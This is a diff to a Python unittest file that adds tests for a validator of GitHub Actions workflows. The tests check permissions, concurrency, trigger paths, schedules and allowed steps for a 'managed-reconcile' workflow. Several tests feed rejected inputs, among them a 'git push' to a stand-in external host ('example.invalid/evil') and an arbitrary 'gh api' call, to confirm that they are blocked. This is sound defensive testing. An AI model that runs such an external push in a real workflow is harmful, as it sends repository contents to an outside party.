@@ -28,23 +28,59 @@ class WorkflowScopeTests(unittest.TestCase):
                 "workflow_dispatch": {},
             },
             "permissions": {"contents": "write", "issues": "read"},
+            "concurrency": dict(validator.STATE_WRITER_CONCURRENCY),
             "jobs": {"reconcile": {"steps": [{"uses": "actions/checkout@v4"}, {"run": run}]}},
         }
 
-    def test_current_workflow_passes(self):
+    def managed_reconcile_workflow(self, run: str = "git push origin HEAD:main"):
+        return {
+            "on": {
+                "push": {"branches": ["main"], "paths": list(validator.MANAGED_RECONCILE_PATHS)},
+                "schedule": [{"cron": validator.MANAGED_RECONCILE_CRON}],
+                "workflow_dispatch": {},
+            },
+            "permissions": {"contents": "write"},
+            "concurrency": dict(validator.STATE_WRITER_CONCURRENCY),
+            "jobs": {"reconcile": {"steps": [{"uses": "actions/checkout@v4"}, {"run": run}]}},
+        }
+
+    def test_current_workflows_pass(self):
         validator.validate(ROOT / ".github" / "workflows" / "steward.yml")
         validator.validate(ROOT / ".github" / "workflows" / "task-reconcile.yml")
+        validator.validate(ROOT / ".github" / "workflows" / "managed-reconcile.yml")
 
     def test_task_reconcile_write_scope_is_allowed(self):
         path = Path(".github/workflows/task-reconcile.yml")
         workflow = self.task_reconcile_workflow()
         validator.validate_permissions(path, workflow)
+        validator.validate_concurrency(path, workflow)
         validator.validate_triggers(path, workflow)
         validator.validate_steps(path, workflow)
+
+    def test_managed_reconcile_write_scope_is_allowed(self):
+        path = Path(".github/workflows/managed-reconcile.yml")
+        workflow = self.managed_reconcile_workflow()
+        validator.validate_permissions(path, workflow)
+        validator.validate_concurrency(path, workflow)
+        validator.validate_triggers(path, workflow)
+        validator.validate_steps(path, workflow)
+
+    def test_state_writer_concurrency_drift_is_rejected(self):
+        path = Path(".github/workflows/managed-reconcile.yml")
+        workflow = self.managed_reconcile_workflow()
+        workflow["concurrency"]["group"] = "other"
+        with self.assertRaisesRegex(ValueError, "serialized concurrency"):
+            validator.validate_concurrency(path, workflow)
 
     def test_task_reconcile_external_git_push_is_rejected(self):
         path = Path(".github/workflows/task-reconcile.yml")
         workflow = self.task_reconcile_workflow(run="git push https://example.invalid/evil main")
+        with self.assertRaisesRegex(ValueError, "git push"):
+            validator.validate_steps(path, workflow)
+
+    def test_managed_reconcile_external_git_push_is_rejected(self):
+        path = Path(".github/workflows/managed-reconcile.yml")
+        workflow = self.managed_reconcile_workflow(run="git push https://example.invalid/evil main")
         with self.assertRaisesRegex(ValueError, "git push"):
             validator.validate_steps(path, workflow)
 
@@ -54,17 +90,48 @@ class WorkflowScopeTests(unittest.TestCase):
         with self.assertRaisesRegex(ValueError, "GitHub API"):
             validator.validate_steps(path, workflow)
 
+    def test_managed_reconcile_cannot_add_arbitrary_gh_api(self):
+        path = Path(".github/workflows/managed-reconcile.yml")
+        workflow = self.managed_reconcile_workflow(run="gh api repos/example/other/issues")
+        with self.assertRaisesRegex(ValueError, "GitHub API"):
+            validator.validate_steps(path, workflow)
+
     def test_task_reconcile_ignored_generated_staging_requires_force(self):
         path = Path(".github/workflows/task-reconcile.yml")
         workflow = self.task_reconcile_workflow(run="git add -- state/tasks.yml kb/generated/tasks.pl")
         with self.assertRaisesRegex(ValueError, "generated task staging"):
             validator.validate_steps(path, workflow)
 
+    def test_managed_reconcile_staging_is_exactly_bounded(self):
+        path = Path(".github/workflows/managed-reconcile.yml")
+        workflow = self.managed_reconcile_workflow(run="git add -A")
+        with self.assertRaisesRegex(ValueError, "managed GitHub staging"):
+            validator.validate_steps(path, workflow)
+
+    def test_managed_reconcile_exact_staging_is_allowed(self):
+        path = Path(".github/workflows/managed-reconcile.yml")
+        workflow = self.managed_reconcile_workflow(run=validator.MANAGED_RECONCILE_GIT_ADD)
+        validator.validate_steps(path, workflow)
+
     def test_task_reconcile_schedule_drift_is_rejected(self):
         path = Path(".github/workflows/task-reconcile.yml")
         workflow = self.task_reconcile_workflow()
         workflow["on"]["schedule"] = [{"cron": "* * * * *"}]
         with self.assertRaisesRegex(ValueError, "schedule"):
+            validator.validate_triggers(path, workflow)
+
+    def test_managed_reconcile_schedule_drift_is_rejected(self):
+        path = Path(".github/workflows/managed-reconcile.yml")
+        workflow = self.managed_reconcile_workflow()
+        workflow["on"]["schedule"] = [{"cron": "* * * * *"}]
+        with self.assertRaisesRegex(ValueError, "schedule"):
+            validator.validate_triggers(path, workflow)
+
+    def test_managed_reconcile_push_scope_drift_is_rejected(self):
+        path = Path(".github/workflows/managed-reconcile.yml")
+        workflow = self.managed_reconcile_workflow()
+        workflow["on"]["push"]["paths"].append("state/automations.yml")
+        with self.assertRaisesRegex(ValueError, "approved paths"):
             validator.validate_triggers(path, workflow)
 
     def test_task_reconcile_pr_close_trigger_drift_is_rejected(self):
